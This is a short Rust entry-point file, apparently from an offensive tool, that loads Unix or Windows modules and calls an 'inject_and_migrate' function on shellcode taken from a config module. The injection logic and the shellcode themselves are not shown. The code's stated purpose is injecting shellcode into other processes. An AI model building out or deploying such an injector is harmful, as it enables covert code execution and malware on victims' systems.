// Load configuration values
mod config;

// Load the appropriate operating system's implementation
#[cfg(unix)]
mod unix_im;

#[cfg(windows)]
extern crate windows;
#[cfg(windows)]
mod windows_im;

fn main() {
    if cfg!(target_os = "windows"){
        #[cfg(windows)]
        windows_im::inject_and_migrate(config::SHELLCODE);
    }
    else {
        #[cfg(unix)]
        unix_im::inject_and_migrate(config::SHELLCODE);
    };
}